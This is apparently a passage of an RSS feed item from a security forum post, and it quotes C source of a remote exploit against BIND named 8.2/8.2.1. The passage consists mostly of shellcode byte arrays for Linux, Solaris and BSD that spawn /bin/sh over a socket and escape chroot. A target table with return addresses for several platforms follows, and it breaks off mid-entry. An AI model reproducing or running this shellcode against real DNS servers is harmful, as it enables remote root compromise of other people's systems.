+0x0,0x0,0xb8,0x66,0x0,0x0,0x0,0xcd,0x80,0x83,0xc4,0xc,0x89,0xc0,0x85,0xc0, 
+0x75,0xda,0x66,0x83,0x7e,0x8,0x2,0x75,0xd3,0x8b,0x56,0x4,0x4a,0x52,0x89,0xd3, 
+0xb9,0x0,0x0,0x0,0x0,0xb8,0x3f,0x0,0x0,0x0,0xcd,0x80,0x5a,0x52,0x89,0xd3, 
+0xb9,0x1,0x0,0x0,0x0,0xb8,0x3f,0x0,0x0,0x0,0xcd,0x80,0x5a,0x52,0x89,0xd3, 
+0xb9,0x2,0x0,0x0,0x0,0xb8,0x3f,0x0,0x0,0x0,0xcd,0x80,0xeb,0x12,0x5e,0x46, 
+0x46,0x46,0x46,0x46,0xc7,0x46,0x10,0x0,0x0,0x0,0x0,0xe9,0xfe,0xfe,0xff,0xff, 
+0xe8,0xe9,0xff,0xff,0xff,0xe8,0x4f,0xfe,0xff,0xff,0x2f,0x62,0x69,0x6e,0x2f, 
+0x73,0x68,0x0,0x2d,0x63,0x0,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff, 
+0xff,0xff,0xff,0xff,0x0,0x0,0x0,0x0,0x70,0x6c,0x61,0x67,0x75,0x65,0x7a,0x5b, 
+0x41,0x44,0x4d,0x5d,0x31,0x30,0x2f,0x39,0x39,0x2d}; 
+
+char sc&#91;&#93;= 
+{0x40,0x0,0x0,0x2e,0x1,0x0,0x0,0x0,0x90,0x3,0xe0,0xd5,0x92,0x10,0x20,0x0, 
+0x82,0x10,0x20,0x5,0x91,0xd0,0x20,0x0,0xa0,0x10,0x0,0x8,0x90,0x3,0xe0,0xcc, 
+0x92,0x10,0x21,0xff,0x82,0x10,0x20,0x50,0x91,0xd0,0x20,0x0,0x90,0x3,0xe0, 
+0xcc,0x82,0x10,0x20,0x3d,0x91,0xd0,0x20,0x0,0x90,0x10,0x0,0x10,0x82,0x10, 
+0x20,0x78,0x91,0xd0,0x20,0x0,0x90,0x10,0x0,0x10,0x82,0x10,0x20,0x6,0x91,0xd0, 
+0x20,0x0,0x90,0x3,0xe0,0xd7,0x82,0x10,0x20,0xc,0x91,0xd0,0x20,0x0,0x90,0x3, 
+0xe0,0xd5,0x82,0x10,0x20,0x3d,0x91,0xd0,0x20,0x0,0xa0,0x10,0x20,0x0,0x90, 
+0x10,0x0,0x10,0x82,0x10,0x20,0x6,0x91,0xd0,0x20,0x0,0xa0,0x4,0x20,0x1,0x80, 
+0xa4,0x20,0x1e,0x4,0xbf,0xff,0xfb,0x1,0x0,0x0,0x0,0x90,0x3,0xe0,0xc0,0xa0, 
+0x3,0xe0,0xc5,0xe0,0x23,0xbf,0xf0,0xa0,0x3,0xe0,0xc9,0xe0,0x23,0xbf,0xf4, 
+0xa0,0x3,0xe1,0x5,0xe0,0x23,0xbf,0xf8,0xc0,0x23,0xbf,0xfc,0x92,0x3,0xbf,0xf0, 
+0x94,0x3,0xbf,0xfc,0x82,0x10,0x20,0x3b,0x91,0xd0,0x20,0x0,0x81,0xc3,0xe0,0x8, 
+0x1,0x0,0x0,0x0,0x2f,0x62,0x69,0x6e,0x2f,0x6b,0x73,0x68,0x0,0x2d,0x63,0x0, 
+0x41,0x44,0x4d,0x52,0x4f,0x43,0x4b,0x53,0x0,0x2e,0x0,0x2e,0x2e,0x2f,0x2e, 
+0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e, 
+0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x0,0x68,0x6f,0x72,0x69,0x7a,0x6f, 
+0x6e,0x5b,0x41,0x44,0x4d,0x5d,0x31,0x30,0x2f,0x39,0x39,0x0}; 
+
+char bsdcode&#91;&#93;= 
+{0xe9,0xd4,0x1,0x0,0x0,0x5e,0x31,0xc0,0x50,0x50,0xb0,0x17,0xcd,0x80,0x31,0xc0, 
+0x50,0x50,0x56,0x50,0xb0,0x5,0xcd,0x80,0x89,0x46,0x28,0xb9,0xff,0x1,0x0,0x0, 
+0x51,0x8d,0x46,0x2,0x50,0x50,0xb8,0x88,0x0,0x0,0x0,0xcd,0x80,0x8d,0x46,0x2, 
+0x50,0x50,0xb8,0x3d,0x0,0x0,0x0,0xcd,0x80,0x8b,0x46,0x28,0x50,0x50,0xb8,0xa7, 
+0x0,0x0,0x0,0x34,0xaa,0xcd,0x80,0x8d,0x46,0xb,0x50,0x50,0xb8,0xa6,0x0,0x0, 
+0x0,0x34,0xaa,0xcd,0x80,0x8d,0x46,0x21,0x48,0x50,0x50,0xb8,0x3d,0x0,0x0,0x0, 
+0xcd,0x80,0x50,0xb8,0x2,0x0,0x0,0x0,0xcd,0x80,0x85,0xc0,0xf,0x85,0xe6,0x0, 
+0x0,0x0,0x8d,0x56,0x38,0x89,0x56,0x28,0x8d,0x46,0x40,0x89,0x46,0x2c,0x8d, 
+0x46,0x43,0x89,0x46,0x30,0x8d,0x46,0x30,0x50,0x8d,0x46,0x28,0x50,0x52,0x50, 
+0xb8,0x3b,0x0,0x0,0x0,0xcd,0x80,0x50,0x50,0xb8,0x1,0x0,0x0,0x0,0xcd,0x80, 
+0xe8,0xbc,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x62,0x6c,0x61,0x68, 
+0x62,0x6c,0x61,0x68,0x73,0x61,0x6d,0x65,0x74,0x68,0x69,0x6e,0x67,0x79,0x65, 
+0x74,0x61,0x6e,0x6f,0x74,0x68,0x65,0x72,0x73,0x70,0x61,0x63,0x65,0x66,0x6f, 
+0x72,0x61,0x73,0x6f,0x63,0x6b,0x61,0x64,0x64,0x72,0x73,0x74,0x72,0x75,0x63, 
+0x74,0x75,0x72,0x65,0x62,0x75,0x74,0x74,0x68,0x69,0x73,0x74,0x69,0x6d,0x65, 
+0x66,0x6f,0x72,0x74,0x68,0x65,0x62,0x73,0x64,0x73,0x68,0x65,0x6c,0x6c,0x63, 
+0x6f,0x64,0x65,0x66,0x6f,0x72,0x74,0x75,0x6e,0x61,0x74,0x6c,0x79,0x74,0x68, 
+0x69,0x73,0x77,0x69,0x6c,0x6c,0x77,0x6f,0x72,0x6b,0x69,0x68,0x6f,0x70,0x65, 
+0x6f,0x6b,0x69,0x74,0x68,0x69,0x6e,0x6b,0x65,0x6e,0x6f,0x75,0x67,0x68,0x73, 
+0x70,0x61,0x63,0x65,0x6e,0x6f,0x77,0x0,0x70,0x6c,0x61,0x67,0x75,0x65,0x7a, 
+0x5b,0x41,0x44,0x4d,0x5d,0x20,0x42,0x53,0x44,0x20,0x63,0x72,0x61,0x70,0x70, 
+0x79,0x20,0x73,0x68,0x65,0x6c,0x6c,0x63,0x6f,0x64,0x65,0x20,0x2d,0x20,0x31, 
+0x30,0x2f,0x39,0x39,0x31,0xd2,0xe9,0x3f,0xff,0xff,0xff,0x8d,0x46,0x4,0x50, 
+0x8d,0x46,0x8,0x50,0x52,0x52,0xb8,0x1f,0x0,0x0,0x0,0xcd,0x80,0x5a,0x83,0xf8, 
+0x0,0x75,0x6,0x80,0x7e,0x9,0x2,0x74,0xc,0x52,0x52,0xb8,0x6,0x0,0x0,0x0,0xcd, 
+0x80,0x42,0xeb,0xd7,0x6a,0x0,0x52,0x52,0xb8,0x5a,0x0,0x0,0x0,0xcd,0x80,0x6a, 
+0x1,0x52,0x52,0xb8,0x5a,0x0,0x0,0x0,0xcd,0x80,0x6a,0x2,0x52,0x52,0xb8,0x5a, 
+0x0,0x0,0x0,0xcd,0x80,0xeb,0x29,0x5e,0x46,0x46,0x46,0x46,0x46,0x8d,0x56,0x38, 
+0x89,0x56,0x28,0xc7,0x46,0x2c,0x0,0x0,0x0,0x0,0x8d,0x46,0x34,0x50,0x8d,0x46, 
+0x28,0x50,0x52,0x52,0xb8,0x3b,0x0,0x0,0x0,0xcd,0x80,0xe9,0xc1,0xfe,0xff,0xff, 
+0xe8,0xd2,0xff,0xff,0xff,0xe8,0x27,0xfe,0xff,0xff,0x2e,0x0,0x41,0x44,0x4d, 
+0x52,0x4f,0x43,0x4b,0x53,0x0,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f, 
+0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f, 
+0x0,0x2e,0x2f,0x0,0x0,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff, 
+0xff,0x0,0x0,0x0,0x0,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x0,0x2d,0x63,0x0, 
+0x74,0x6f,0x75,0x63,0x68,0x20,0x2f,0x74,0x6d,0x70,0x2f,0x59,0x4f,0x59,0x4f, 
+0x59,0x4f,0x0}; 
+
+char bsdnochroot&#91;&#93;= 
+{0xe9,0x79,0x1,0x0,0x0,0x5e,0x50,0xb8,0x2,0x0,0x0,0x0,0xcd,0x80,0x85,0xc0,0xf, 
+0x85,0xe6,0x0,0x0,0x0,0x8d,0x56,0x38,0x89,0x56,0x28,0x8d,0x46,0x40,0x89,0x46, 
+0x2c,0x8d,0x46,0x43,0x89,0x46,0x30,0x8d,0x46,0x30,0x50,0x8d,0x46,0x28,0x50, 
+0x52,0x50,0xb8,0x3b,0x0,0x0,0x0,0xcd,0x80,0x50,0x50,0xb8,0x1,0x0,0x0,0x0, 
+0xcd,0x80,0xe8,0xbc,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0xff,0x0,0x0,0x0,0x62,0x6c, 
+0x61,0x68,0x62,0x6c,0x61,0x68,0x73,0x61,0x6d,0x65,0x74,0x68,0x69,0x6e,0x67, 
+0x79,0x65,0x74,0x61,0x6e,0x6f,0x74,0x68,0x65,0x72,0x73,0x70,0x61,0x63,0x65, 
+0x66,0x6f,0x72,0x61,0x73,0x6f,0x63,0x6b,0x61,0x64,0x64,0x72,0x73,0x74,0x72, 
+0x75,0x63,0x74,0x75,0x72,0x65,0x62,0x75,0x74,0x74,0x68,0x69,0x73,0x74,0x69, 
+0x6d,0x65,0x66,0x6f,0x72,0x74,0x68,0x65,0x62,0x73,0x64,0x73,0x68,0x65,0x6c, 
+0x6c,0x63,0x6f,0x64,0x65,0x66,0x6f,0x72,0x74,0x75,0x6e,0x61,0x74,0x6c,0x79, 
+0x74,0x68,0x69,0x73,0x77,0x69,0x6c,0x6c,0x77,0x6f,0x72,0x6b,0x69,0x68,0x6f, 
+0x70,0x65,0x6f,0x6b,0x69,0x74,0x68,0x69,0x6e,0x6b,0x65,0x6e,0x6f,0x75,0x67, 
+0x68,0x73,0x70,0x61,0x63,0x65,0x6e,0x6f,0x77,0x0,0x70,0x6c,0x61,0x67,0x75, 
+0x65,0x7a,0x5b,0x41,0x44,0x4d,0x5d,0x20,0x42,0x53,0x44,0x20,0x63,0x72,0x61, 
+0x70,0x70,0x79,0x20,0x73,0x68,0x65,0x6c,0x6c,0x63,0x6f,0x64,0x65,0x20,0x2d, 
+0x20,0x31,0x30,0x2f,0x39,0x39,0x31,0xd2,0xe9,0x3f,0xff,0xff,0xff,0x5e,0x8d, 
+0x46,0x4,0x50,0x8d,0x46,0x8,0x50,0x52,0x52,0xb8,0x1f,0x0,0x0,0x0,0xcd,0x80, 
+0x5a,0x83,0xf8,0x0,0x75,0x6,0x80,0x7e,0x9,0x2,0x74,0xc,0x52,0x52,0xb8,0x6, 
+0x0,0x0,0x0,0xcd,0x80,0x42,0xeb,0xd7,0x6a,0x0,0x52,0x52,0xb8,0x5a,0x0,0x0, 
+0x0,0xcd,0x80,0x6a,0x1,0x52,0x52,0xb8,0x5a,0x0,0x0,0x0,0xcd,0x80,0x6a,0x2, 
+0x52,0x52,0xb8,0x5a,0x0,0x0,0x0,0xcd,0x80,0xeb,0x29,0x5e,0x46,0x46,0x46,0x46, 
+0x46,0x8d,0x56,0x38,0x89,0x56,0x28,0xc7,0x46,0x2c,0x0,0x0,0x0,0x0,0x8d,0x46, 
+0x34,0x50,0x8d,0x46,0x28,0x50,0x52,0x52,0xb8,0x3b,0x0,0x0,0x0,0xcd,0x80,0xe9, 
+0xc0,0xfe,0xff,0xff,0xe8,0xd2,0xff,0xff,0xff,0xe8,0x82,0xfe,0xff,0xff,0x2e, 
+0x0,0x41,0x44,0x4d,0x52,0x4f,0x43,0x4b,0x53,0x0,0x2e,0x2e,0x2f,0x2e,0x2e, 
+0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e, 
+0x2f,0x2e,0x2e,0x2f,0x0,0x2e,0x2f,0x0,0x0,0xff,0xff,0xff,0xff,0xff,0xff,0xff, 
+0xff,0xff,0xff,0xff,0xff,0x0,0x0,0x0,0x0,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68, 
+0x0,0x2d,0x63,0x0,0x74,0x6f,0x75,0x63,0x68,0x20,0x2f,0x74,0x6d,0x70,0x2f, 
+0x59,0x4f,0x59,0x4f,0x59,0x4f,0x0}; 
+
+struct arch 
+{ 
+int id; 
+char *name; 
+char *code; 
+int codesize; 
+unsigned long safe; 
+unsigned long ret; 
+int length; 
+}; 
+
+struct arch archlist&#91;&#93; = 
+{ 
+{1, "Linux Redhat 6.x - named 8.2/8.2.1 &#40;from rpm&#41;", linuxcode, sizeof&#40;linuxcode&#41;, 0, 0xbfffd6c3, 6500}, 
+{2, "Linux SolarDiz's non-exec stack patch - named 8.2/8.2.1",linuxcode, sizeof&#40;linuxcode&#41;, 0, 0x80f79ae, 6500}, 
+{3, "Solaris 7 &#40;0xff&#41; - named 8.2.1", sc, sizeof&#40;sc&#41;, 0xffbea738, 0xffbedbd0, 11000}, 
+{4, "Solaris 2.6 - named 8.2.1", sc, sizeof&#40;sc&#41;, 0xefffa000, 0xefffe5d0, 11000}, 
+{5, "Free</pre>
+		</div>
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/98.hva#400</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/98.hva#400</link>
+				<pubDate><![CDATA[Fri, 16 Jun 2006 08:50:30]]> GMT</pubDate>
+				<author><![CDATA[ phuchn71]]></author>
+			</item>
+	</channel>
+</rss>
